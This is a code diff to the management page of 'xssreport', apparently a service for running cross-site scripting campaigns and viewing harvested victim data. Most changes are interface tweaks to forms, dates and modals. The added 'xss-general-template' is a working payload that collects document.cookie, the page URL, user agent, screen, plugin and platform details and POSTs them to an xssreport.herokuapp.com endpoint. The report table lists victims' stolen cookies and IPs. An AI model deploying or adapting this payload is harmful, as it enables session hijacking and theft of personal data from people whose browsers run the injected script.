@@ -20,15 +20,29 @@
   <script src="http://gs.ccp.li/xssreport/assets/uglifyjs.1.2.5.min.js"></script>
   <script src="http://gs.ccp.li/xssreport/assets/uglifyjs.1.2.5.min.js"></script>
   <script src="http://gs.ccp.li/xssreport/assets/jquery.blockUI.2.54.js"></script>
+  <script src="/static/assets/moment.1.7.2.min.js"></script>
   <link href="http://gs.ccp.li/xssreport/assets/highlightjs.default.7.3.min.css" rel="stylesheet">
   <link href="http://gs.ccp.li/xssreport/assets/bootstrap/css/bootstrap-combined.2.2.2.min.css" rel="stylesheet">
-  <!-- <link href="//netdna.bootstrapcdn.com/bootswatch/2.1.1/cosmo/bootstrap.min.css" rel="stylesheet"> -->
+  <link href="//netdna.bootstrapcdn.com/bootswatch/2.1.1/cosmo/bootstrap.min.css" rel="stylesheet">
   <link href="http://gs.ccp.li/xssreport/assets/codemirror.3.0/lib/util/simple-hint.css" rel="stylesheet">
   <link href="http://gs.ccp.li/xssreport/assets/codemirror.3.0/lib/codemirror.css" rel="stylesheet">
   <script src="/static/manage.js"></script>
   <link href="/static/manage.css" rel="stylesheet">
 </head>
 <body>
+  <script type="text/underscore-template" id="home-template">
+    <div class="row">
+      <div class="span6">
+        <button class="btn btn-large show-scripts">Scripts</button>
+      </div>
+      <div class="span6">
+        <button class="btn btn-large show-reports">Reports</button>
+        <% if (typeof uris !== 'undefined') { _.each(uris, function(uri) { %>
+          
+        <% }); } %>
+      </div>
+    </div>
+  </script>
   <script type="text/underscore-template" id="script-edit-template">
     <form class="form-horizontal"><fieldset>
       <div class="row"><div class="span12">
@@ -36,15 +50,15 @@
         <div class="control-group">
           <label class="control-label" for="name">Name</label>
           <div class="controls">
-            <input class="input-medium" id="name" type="text" value="<%- name %>"></input>
+            <input class="input-medium" id="name" type="text" value="<%- name %>" required></input>
           </div>
         </div>
         <div class="control-group">
-          <label class="control-label" for="uri" required>URI</label>
+          <label class="control-label" for="uri">URI</label>
           <div class="controls">
             <div class="input-prepend">
               <span class="add-on">http://xssreport.herokuapp.com/x/</span>
-              <input class="input-small" id="uri" type="text" value="<%- uri %>"></input>
+              <input class="input-small" id="uri" type="text" value="<%- uri %>" required></input>
             </div>
           </div>
         </div>
@@ -109,8 +123,8 @@
               <td><%- item.name %></td>
               <td><%- item.uri %></td>
               <td><a href="<%- item.short_url %>"><%- item.short_url %></a></td>
-              <td><%- item.created %></td>
-              <td><%- item.last_edited %></td>
+              <td><%- XSSReport.formatDate(item.created) %></td>
+              <td><%- XSSReport.formatDate(item.last_edited) %></td>
               <td>
                 <div class="btn-group">
                   <a class="btn use-script" href="#"><i class="icon-user icon-info-sign"></i> Show Usage</a>
@@ -133,6 +147,40 @@
       </ul>
       <div class="modal hide fade" role="dialog"></div>
     </div></div>
+  </script>
+  <script type="text/underscore-template" id="new-script-template">
+    <div class="modal-header">
+      <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+      <h3 id="myModalLabel">Create New Script</h3>
+    </div>
+    <div class="modal-body">
+      <div class="alert alert-error error" style="display:none"></div>
+      <form class="form-horizontal"><fieldset>
+        <div class="control-group">
+          <label class="control-label" for="name">Name</label>
+          <div class="controls">
+            <input class="input-medium" id="name" type="text" value="" required></input>
+          </div>
+        </div>
+        <div class="control-group">
+          <label class="control-label" for="uri">URI</label>
+          <div class="controls">
+            <div class="input-prepend">
+              <span class="add-on">http://xssreport.herokuapp.com/x/</span>
+              <input class="input-small" id="uri" type="text" value="" required></input>
+            </div>
+          </div>
+        </div>
+        <div class="control-group">
+          <pre><code class="coffeescript" id="new-script-code"></code></pre>
+        </div>
+      </fieldset></form>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-warning create-custom-script pull-left">Create Custom Script</button>
+      <button class="btn" data-dismiss="modal" aria-hidden="true">Close</button>
+      <button class="btn btn-primary save-new-script">Save</button>
+    </div>
   </script>
   <script type="text/underscore-template" id="script-usage-template">
     <div class="modal-header">
@@ -167,7 +215,7 @@
             <tr data-id="<%- item.id %>">
               <td><%- item.id %></td>
               <td><%- item.url %></td>
-              <td><%- item.created %></td>
+              <td><%- XSSReport.formatDate(item.created) %></td>
               <td><%- item.remote_ip %></a></td>
               <td><%- item.cookie %></td>
               <td><%- item.useragent %></td>
@@ -181,6 +229,28 @@
       </ul>
     </div></div>
   </script>
+  <script type="text/underscore-template" id="xss-general-template"># cookie
+d = 'c=' + encodeURIComponent(document.cookie)
+# url
+d += '&u=' + encodeURIComponent(window.location.href)
+# useragent 
+d += '&ua=' + encodeURIComponent(navigator.userAgent)
+# screen
+s = ''
+for k, v of screen
+  s += k + ':' + v + ';'
+d += '&s=' + encodeURIComponent(s)
+# plugins, platform
+a = 'Plugins:'
+for p in navigator.plugins
+  a += (p.name || '') + ', '
+a += '; Platform:' + navigator.platform + ';'
+d += '&a=' + encodeURIComponent(a)
+
+xmlhttp = if window.XMLHttpRequest then new XMLHttpRequest() else new ActiveXObject("Microsoft.XMLHTTP")
+xmlhttp.open("POST", (if 'https:' == document.location.protocol then 'https://' else 'http://') + "xssreport.herokuapp.com/r/<%= uri %>/",true)
+xmlhttp.send(d)
+  </script>
   <div class="container">
     <div class="">
       <div class="alert alert-success global-flash" style="display:none; ">
@@ -191,10 +261,11 @@
       </div>
       <div class="row footer"><div class="span12">
         <div class="muted" align="middle">
-          <p>Copyright</p>
+          <p>Copyright © 2012 Changping Chen, All Rights Reserved</p>
         </div>
       </div></div>
     </div>
   </div>
+  <div id="center" style="position:fixed;top:50%;left:50%"></div>
 </body>
 </html>
